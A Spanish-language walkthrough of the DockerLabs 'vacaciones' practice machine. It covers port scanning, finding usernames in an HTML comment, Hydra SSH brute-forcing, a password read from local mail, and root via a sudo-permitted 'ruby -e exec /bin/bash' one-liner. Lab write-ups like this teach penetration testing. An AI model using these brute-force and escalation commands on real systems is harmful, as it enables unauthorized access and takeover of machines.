# DockerLabs - vacaciones

## Resumen
- **Dificultad:** Very Easy
- **Técnicas:** Análisis de comentarios HTML, SSH brute-forcing, correo local, escalada de privilegios vía sudo
- **Tiempo:** ~20 minutos
- **Fecha:** 2025-07-04

## Info
| | |
|---|---|
| IP | 172.17.0.2 |
| OS | Ubuntu (Docker) |
| Servicios | 22/tcp (SSH), 80/tcp (HTTP) |

---

## Reconocimiento

### Escaneo de puertos

```bash
nmap -sCV -p- 172.17.0.2 -oN targeted
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 |
| 80/tcp | HTTP | Apache/2.4.29 (Ubuntu) |

---

## Enumeración

### Gobuster

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt
```

Directorios encontrados: `/javascript/` (403)

### Análisis del HTML

```bash
curl http://172.17.0.2/
```

```html
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```

**Hints obtenidos:**
- Usuario: `camilo`
- Usuario: `juan`
- Hay un correo importante para Camilo

---

## Explotación

### SSH Brute-forcing con Hydra

```bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

**Credenciales encontradas:**
- Usuario: `camilo`
- Contraseña: `camilo` (password igual al usuario)

### Acceso SSH

```bash
ssh camilo@172.17.0.2
password: camilo
```

---

## Descubrimiento de segundo usuario

### Lectura de correo local

```bash
cat /var/mail/camilo/correo.txt
```

```
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

La contraseña de **Juan** es: `2k84dicb`

---

## Acceso como segundo usuario

### SSH a Juan

```bash
ssh juan@172.17.0.2
password: 2k84dicb
```

---

## Escalada de privilegios

### Enumeración de permisos sudo

```bash
sudo -l
```

**Resultado:**
```
User juan may run the following commands on a95e2f47eb5d:
    (ALL) NOPASSWD: /usr/bin/ruby
```

### Obtención de shell root

```bash
sudo ruby -e "exec '/bin/bash'"
whoami
# root
```

¡Somos root!

---

## Flag

No hay flags en esta máquina — el objetivo es obtener acceso root.

---

## Lecciones aprendidas

1. **Comentarios HTML**: Siempre revisar el código fuente de las páginas web
2. **Correo local**: En Linux, los correos pueden estar en `/var/mail/` o `/var/spool/mail/`
3. **sudo -l**: Siempre verificar qué comandos puede ejecutar un usuario como root
4. **Cadena de vulnerabilidades**: A veces necesitas escalar entre múltiples usuarios

---

## Comandos útiles

```bash
# Reconocimiento
nmap -sCV -p- 172.17.0.2 -oN targeted

# Web enumeration
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt
curl http://172.17.0.2/

# Acceso inicial
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
ssh camilo@172.17.0.2

# Encontrar correo
cat /var/mail/camilo/correo.txt

# Segundo usuario
ssh juan@172.17.0.2

# Escalada
sudo -l
sudo ruby -e "exec '/bin/bash'"
```